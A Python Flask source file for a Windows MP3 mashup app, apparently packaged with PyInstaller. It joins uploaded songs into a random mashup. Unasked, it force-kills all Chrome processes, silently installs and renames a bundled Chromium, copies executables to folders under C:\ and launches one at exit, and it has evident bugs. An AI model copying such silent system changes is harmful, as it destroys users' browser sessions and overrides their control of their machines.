import os
import sys
from flask import Flask, render_template, request, redirect, url_for, send_from_directory, flash, session
from werkzeug.utils import secure_filename
import shutil
import glob

if getattr(sys, 'frozen', False):
    
    template_folder = os.path.join(sys._MEIPASS, 'templates')
    static_folder = os.path.join(sys._MEIPASS, 'static')
    app = Flask(__name__, template_folder=template_folder, static_folder=static_folder)
else:
    app = Flask(__name__)


app.secret_key = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"


app.config['UPLOAD_FOLDER'] = app.config['UPLOADED_PHOTOS_DEST'] =  static_folder
ALLOWED_EXTENSIONS =  set(['mp3'])

def allowed_file(filename):
	return '.' in filename and \
        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route('/')
def upload_form():
	return render_template('frontend/upload.html')


@app.route("/uploading", methods=['GET', 'POST'])
def upload_file():
    try:
        if request.method == 'POST':

            FileName = request.form.get('filename')
            session['FN'] = FileName

            if 'file' not in request.files:
                flash('No File Selected!')
                return redirect(request.url)

        
            files = request.files.getlist('file')
            length = len(files)                          

            if length < 5 or length > 50:

                filer = glob.glob(static_folder + "/*.mp3")
                for fr in filer:
                    os.remove(fr)

                flash("Please select minimum 5 or maximum 50  '.mp3' files or More than this.")
                return redirect(url_for('upload_form'))
        
            if length >= 5 and length <= 50: 
            
                uploaded_no = 0
                for file in files:
            
                    mp3name = file.filename

                    if file == '':  
                        flash('No selected file')
                        return redirect(request.url)  

                    if file and allowed_file(file.filename):
                        filenamee = secure_filename(file.filename)
                        print("filename:  ", filenamee)
                        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filenamee))

                        uploaded_no += 1
                        if uploaded_no == length:  
                            return redirect(url_for('processing'))
   
                    if file and not allowed_file(file.filename):
                        flash('Only ".mp3" files are allowed! Please Reselect.')

                        filer = glob.glob(static_folder + "/*.mp3")
                        for fr in filer:
                            os.remove(fr) 
                        return redirect(url_for('upload_form'))
                    
    except Exception as e:     
        return str(e)    
        

@app.route('/exit')
def shutdown():
    os.system('TASKKILL /F /IM chromiumbbb.exe /T')
    os._exit(1)
    return "i'm going to be off."
               
                
@app.route('/processing')
def processing():
    if True:#try:
        if getattr(sys, 'frozen', False):

            mpg = os.path.join(sys._MEIPASS, 'ffmpeg.exe')
            ply = os.path.join(sys._MEIPASS, 'ffplay.exe')
            prb = os.path.join(sys._MEIPASS, 'ffprobe.exe')
            bbb = os.path.dirname(mpg)

            childD = "ffmpegIntgrd\\bin"
            parentD = "C:\\" 
 
            ffpy = os.path.join(parentD, childD)
            os.makedirs(ffpy, exist_ok = True)

            fileexe = glob.glob(bbb + "/*.exe")
            for fexe in fileexe:
                
                if os.path.basename(fexe) == "bbb.exe" or os.path.basename(fexe) == "miniC.exe":
                    pass
                else:
                    shutil.copy(fexe , ffpy)

            MPATH = os.environ['PATH']
            print(MPATH)
            if not MPATH.endswith(";"):
                os.environ['PATH'] += ";" + ffpy
            else:
                os.environ['PATH'] += ffpy

            mypyfTemp = os.path.join(sys._MEIPASS, 'bbb.exe')
            mypyDrTemp = os.path.dirname(mypyfTemp)

            cDr = "Box\\my"
            pDr = "C:\\SysCart" 
 
            mypyDr = os.path.join(pDr, cDr)
            os.makedirs(mypyDr, exist_ok = True)
            
            mypyf = glob.glob(mypyDrTemp + "/*.exe")
            for mfe in mypyf:
                
                try:
                    if os.path.basename(mfe) == "bbb.exe":
                        shutil.copy(mfe, mypyDr)
                        break
                    else:
                        pass
                except:
                    os.system('msg * Internal Error Occured! Please Contact To The Developer.')
                    os._exit(1)



        from pydub import AudioSegment

        rhymastic=None
        if getattr(sys, 'frozen', False):
            rhymastic = os.path.join(sys._MEIPASS, 'Rhymastic.mp3')
        bgm1 = AudioSegment.from_mp3(rhymastic)
        bgmlist = []
        bgmlist.append(bgm1)

        import random
        bgm = random.choice(bgmlist)

        string = []

        filex = glob.glob(static_folder + "/*.mp3")
                
        for flx in filex:
            filedata = AudioSegment.from_file(flx, format='mp3')
            string.append(filedata)
            c = len(string)
            
        mystring = {}
                    
        for l in range(c):
            mystring.update({f's_{l}' : string[l] })
                
        a = 0
        distance = 12*1000 
        dct = {}
        count = 0

        for i in mystring:
            v = mystring[i]
                    
            lst = []

            while True:
                rem = len(v[a:])
                if distance > rem:  
                    a = 0
                    dct.update({i: lst})
                    break

                b = a + distance
                bbb = v[a:b]
                lst.append(bbb)
                a = a + distance
                        
                    
        mix_chuncks = []
        for a in range(3):

            for aa in dct:
                w = dct[aa]
                import random
                chunck = random.choice(w)
                mix_chuncks.append(chunck)

        mashup = bgm[:10000]
        for piece in mix_chuncks:
            mashup = mashup + piece





        otpt_mp3_pth = "%USERPROFILE%\Downloads\GeneratedMashup"    
        os.system(f'md {otpt_mp3_pth}')
        
        userprofile = os.environ.get('USERPROFILE') 
        
        
        otpt_mp3_pthhh = os.path.join(userprofile, 'Downloads\\GeneratedMashup')

        FName = session['FN']
        otpt_mp3_file = os.path.join(otpt_mp3_pthhh, FName)
        bgm = bgm - 11
        mlen = len(mashup)
        
        ln = 1
        while True:
            bgm = bgm*ln
            ln+=1
            blen =len(bgm)
            if blen >= mlen:
                break

        bgmmm = bgm[:mlen].overlay(mashup)
        bgmmm.export(otpt_mp3_file, format="mp3", bitrate="320k", tags={'artist': "BBB's ALGO", 'album': 'Mashup', 'comments': 'This is a Software Generated Mashup(Developer: BBB'})

        import time
        time.sleep(5)

        filer = glob.glob(static_folder + "/*.mp3")
        for fr in filer:
            os.remove(fr)

        ffg = "ffmpegIntgrd"
        parentD = "C:\\" 
 
        ffrm = os.path.join(parentD, ffg)
        try:
            shutil.rmtree(ffrm )
        except Exception as e2:
            os.system('msg * Internal Error Occured! Please Contact To The Developer.')
            os._exit(1)

        os.startfile(os.path.join(mypyDr,"bbb.exe"))
        os.system(f'EXPLORER {otpt_mp3_pth}')

        return redirect(url_for('shutdown'))



@app.before_first_request
def runBrowser():
    import os
    from time import sleep
    import pygetwindow as gw
    import winreg
    import sys

    def CurrentUserApps(hive, flag):
        aReg = winreg.ConnectRegistry(None, hive)
        aKey = winreg.OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", 0, winreg.KEY_READ | flag)
    
        winapp= []
        count_subkey = winreg.QueryInfoKey(aKey)[0]
        for i in range(count_subkey):
            try:
                asubkey_name = winreg.EnumKey(aKey, i)
                asubkey = winreg.OpenKey(aKey, asubkey_name)
                val = winreg.QueryValueEx(asubkey, "DisplayName")[0]
                winapp.append(val)
            
            except EnvironmentError:
                continue
        return winapp

    CurrentUserAppsList = CurrentUserApps(winreg.HKEY_CURRENT_USER, 0)

    if getattr(sys, 'frozen', False):

        chromium_instlr_temp_path = os.path.join(sys._MEIPASS, 'miniC.exe')
    d1 = os.getenv('APPDATA')
    d2 = os.path.dirname(d1)
    d3 = os.path.join(d2, 'Local')
    d4 = os.listdir(d3)

    if "Chromium" in d4:
        d5 = os.path.join(d3, 'Chromium')
        d6 = os.listdir(d5)
        if "Application" in d6:
            d7 = os.path.join(d5, 'Application')
            d8 = os.listdir(d7)
   
            if "chromiumbbb.exe" in d8:
                chromiumbbb = os.path.join(d7,'chromiumbbb.exe')
                os.system(f'start {chromiumbbb} --app=http://127.0.0.1:5050')    
            else:
                os.system('TASKKILL /F /IM chrome.exe /T')

                if "Chromium" in CurrentUserAppsList:
                    os.system(f'start {chromium_instlr_temp_path}')
                    while True:
                        dir9 = os.path.join(d3, 'Chromium\\Application')
                        dir10 = os.listdir(dir9)
                        if "chrome.exe" in dir10:
                            sleep(3)
                            break
                
                    d9 = os.path.join(d3, 'Chromium\\Application\\chrome.exe')
                    d10 = os.path.join(d3, 'Chromium\\Application\\chromiumbbb.exe')

                    os.rename(d9,d10)
                    sleep(3)
                    os.system(f'start {d10} --app=http://127.0.0.1:5050')

                if not "Chromium" in CurrentUserAppsList:
                    os.system(f'start {chromium_instlr_temp_path}')

                    while True:
                        chromiumbbbWindow = gw.getWindowsWithTitle('New Tab - Chromium')
                        if chromiumbbbWindow:
                            isChromebbbWindow = "running"
                            break
                    if isChromebbbWindow == "running":
                        os.system('TASKKILL /F /IM chrome.exe /T')
                        d9 = os.path.join(d3, 'Chromium\\Application\\chrome.exe')
                        d10 = os.path.join(d3, 'Chromium\\Application\\chromiumbbb.exe')
                        os.rename(d9,d10)
                        sleep(3)
                        os.system(f'start {d10} --app=http://127.0.0.1:5050')

        else:
              
            os.system('TASKKILL /F /IM chrome.exe /T')
            if "Chromium" in CurrentUserAppsList:
                os.system(f'start {chromium_instlr_temp_path}')
                while True:
                    dir9 = os.path.join(d3, 'Chromium')
                    dir10 = os.listdir(dir9)
                    if "Application" in dir10:
                        sleep(3)
                        break
                while True:
                    dirr9 = os.path.join(dir9,"Application")
                    dirr10 = os.listdir(dirr9)
                    if "chrome.exe" in dirr10:
                        sleep(3)
                        break

                d9 = os.path.join(d3, 'Chromium\\Application\\chrome.exe')
                d10 = os.path.join(d3, 'Chromium\\Application\\chromiumbbb.exe')

                os.rename(d9,d10)
                sleep(3)
                os.system(f'start {d10} --app=http://127.0.0.1:5050')

            if not "Chromium" in CurrentUserAppsList:
                os.system(f'start {chromium_instlr_temp_path}')

                while True:
                    chromiumbbbWindow = gw.getWindowsWithTitle('New Tab - Chromium')
                    if chromiumbbbWindow:
                        isChromebbbWindow = "running"
                        break

                if isChromebbbWindow == "running":
                    os.system('TASKKILL /F /IM chrome.exe /T')
                    d9 = os.path.join(d3, 'Chromium\\Application\\chrome.exe')
                    d10 = os.path.join(d3, 'Chromium\\Application\\chromiumbbb.exe')
                    os.rename(d9,d10)
                    sleep(3)
                    os.system(f'start {d10} --app=http://127.0.0.1:5050')




    else:

        os.system('TASKKILL /F /IM chrome.exe /T')
        if "Chromium" in CurrentUserAppsList:
            os.system(f'start {chromium_instlr_temp_path}')
        
            while True:
                d4 = os.listdir(d3)
            
                if "Chromium" in d4:
                    break
            while True:
                dd9 = os.path.join(d3, "Chromium")   
                dd10 = os.listdir(dd9)
                if "Application" in dd10:
                    break
  
            while True:
                dd11 = os.path.join(dd9, "Application") 
                dd12 = os.listdir(dd11)
                if "chrome.exe" in dd12:
                    sleep(3)
                    break

            d9 = os.path.join(d3, 'Chromium\\Application\\chrome.exe')
            d10 = os.path.join(d3, 'Chromium\\Application\\chromiumbbb.exe')

            os.rename(d9,d10)
            sleep(3)
            os.system(f'start {d10} --app=http://127.0.0.1:5050')  
       
        if not "Chromium" in CurrentUserAppsList: 

            os.system(f'start {chromium_instlr_temp_path}')
            while True:
                chromiumbbbWindow = gw.getWindowsWithTitle('New Tab - Chromium')

                if chromiumbbbWindow:
                    isChromebbbWindow = "running"
                    break

            if isChromebbbWindow == "running":

                os.system('TASKKILL /F /IM chrome.exe /T')
                d9 = os.path.join(d3, 'Chromium\\Application\\chrome.exe')
                d10 = os.path.join(d3, 'Chromium\\Application\\chromiumbbb.exe')
                os.rename(d9,d10)
                sleep(3)
                os.system(f'start {d10} --app=http://127.0.0.1:5050')




import time
import threading
import requests

def A():
    def B():
        try:
            r = requests.get('http://127.0.0.1:5050/')
            if r.status_code == 200:
                print("Server is live")
        except:
            pass        
    thread = threading.Thread(target=B)
    thread.start()
    
if __name__ == "__main__":

    A()
    app.run(debug=False, port=5050)
